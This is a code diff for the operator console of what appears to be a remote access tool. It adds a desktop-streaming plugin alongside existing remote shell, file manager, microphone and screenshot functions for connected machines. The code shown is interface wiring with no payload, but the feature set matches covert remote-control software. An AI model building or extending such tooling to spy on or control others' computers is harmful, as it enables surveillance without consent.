@@ -23,6 +23,7 @@ from libs.modechat import get, send
 from plugins.maudio import main as maudio
 from plugins.mexplorer import main as mexplorer
 from plugins.mshell import main as mshell
+from plugins.mdesktop import main as mdesktop
 
 
 # initial geo ip database
@@ -82,7 +83,9 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.remoteShellButton.setDisabled(True)
         self.remoteExplorerButton.setDisabled(True)
         self.remoteAudioButton.setDisabled(True)
+        self.remoteDesktopButton.setDisabled(True)
         self.lockServerButton.setDisabled(True)
+        self.lockServerButton.setVisible(False)
         self.quitServerButton.setDisabled(True)
         self.unlockServerButton.setDisabled(True)
         self.updatePreviewButton.setDisabled(True)
@@ -121,6 +124,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.remoteShellButton.clicked.connect(self.run_shell)
         self.remoteExplorerButton.clicked.connect(self.run_explorer)
         self.remoteAudioButton.clicked.connect(self.run_audio)
+        self.remoteDesktopButton.clicked.connect(self.run_desktop)
 
         # Custom signal for update server table
         self.connect(self, SIGNAL('updateTable()'), self.updateServersTable)
@@ -128,6 +132,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.connect(self, SIGNAL('executeShell()'), lambda: self.execute_plugin(plugin='shell'))
         self.connect(self, SIGNAL('executeExplorer()'), lambda: self.execute_plugin(plugin='explorer'))
         self.connect(self, SIGNAL('executeAudio()'), lambda: self.execute_plugin(plugin='audio'))
+        self.connect(self, SIGNAL('executeDesktop()'), lambda: self.execute_plugin(plugin='desktop'))
 
     # Start Listen for Servers
     def listen_start(self):
@@ -280,7 +285,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 width = screen_info['width']
                 height = screen_info['height']
                 screenbits = screen_info['screenshot']
-                path_to_preview = os.path.join(self.tmp, '__preview.png')
+                path_to_preview = os.path.join(temp_folder, '__preview.png')
                 raw = zlib.decompress(screenbits)
                 size = (int(width), int(height))
                 im = Image.frombuffer('RGB', size, raw, 'raw', 'BGRX', 0, 1)
@@ -375,6 +380,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 self.remoteExplorerButton.setDisabled(True)
                 self.remoteShellButton.setDisabled(True)
                 self.remoteAudioButton.setDisabled(True)
+                self.remoteDesktopButton.setDisabled(True)
                 self.lockServerButton.setVisible(False)
                 self.lockServerButton.setDisabled(True)
                 self.quitServerButton.setDisabled(True)
@@ -382,6 +388,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 self.remoteExplorerButton.setDisabled(False)
                 self.remoteShellButton.setDisabled(False)
                 self.remoteAudioButton.setDisabled(False)
+                self.remoteDesktopButton.setDisabled(False)
                 self.lockServerButton.setVisible(True)
                 self.lockServerButton.setDisabled(False)
                 self.quitServerButton.setDisabled(False)
@@ -392,6 +399,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             self.remoteExplorerButton.setDisabled(True)
             self.remoteShellButton.setDisabled(True)
             self.remoteAudioButton.setDisabled(True)
+            self.remoteDesktopButton.setDisabled(True)
             self.lockServerButton.setVisible(False)
             self.lockServerButton.setDisabled(True)
             self.quitServerButton.setDisabled(True)
@@ -414,6 +422,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             self.eMenu.addAction(QIcon(os.path.join(assets, 'mexplorer.png')), 'File Manager',
                                  self.run_explorer)
             self.eMenu.addAction(QIcon(os.path.join(assets, 'maudio.png')), 'Microphone', self.run_audio)
+            self.eMenu.addAction(QIcon(os.path.join(assets, 'mdesktop.png')), 'Desktop Streaming', self.run_desktop)
 
             self.eMenu.addSeparator()
             self.eMenu.addMenu(self.optionsMenu)
@@ -437,6 +446,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             'shellMode': 'executeShell()',
             'explorerMode': 'executeExplorer()',
             'audioMode': 'executeAudio()',
+            'desktopMode': 'executeDesktop()',
         }
         if signal in signals:
             self.current_sock = sock
@@ -447,6 +457,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             'shell': mshell,
             'explorer': mexplorer,
             'audio': maudio,
+            'desktop': mdesktop,
         }
 
         server = self.current_server()
@@ -454,7 +465,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             args = {
                 'sock': self.current_sock,
                 'socket': self.socks[server]['socket'],
-                'ipAddress': self.socks[server]['ip_address']
+                'ipAddress': self.socks[server]['ip_address'],
+                'tempPath': temp_folder
             }
             plugin_id = id_generator()
             if plugin in plugins:
@@ -462,8 +474,9 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 self.pluginsBank[plugin_id].show()
 
     def run_shell(self):
-        sockind = int(self.serversTable.item(self.serversTable.currentRow(), self.index_of_socket).text())
-        send(self.socks[sockind]['sock'], 'startChildSocket %s' % sockind, 'shellMode')
+        server = self.current_server()
+        if server:
+            send(self.socks[server]['sock'], 'startChildSocket %s' % server, 'shellMode')
 
     def run_explorer(self):
         server = self.current_server()
@@ -471,8 +484,14 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             send(self.socks[server]['sock'], 'startChildSocket %s' % server, 'explorerMode')
 
     def run_audio(self):
-        sockind = int(self.serversTable.item(self.serversTable.currentRow(), self.index_of_socket).text())
-        send(self.socks[sockind]['sock'], 'startChildSocket %s' % sockind, 'audioMode')
+        server = self.current_server()
+        if server:
+            send(self.socks[server]['sock'], 'startChildSocket %s' % server, 'audioMode')
+
+    def run_desktop(self):
+        server = self.current_server()
+        if server:
+            send(self.socks[server]['sock'], 'startChildSocket %s' % server, 'desktopMode')
 
     def closeEvent(self, event):
         sys.exit(1)
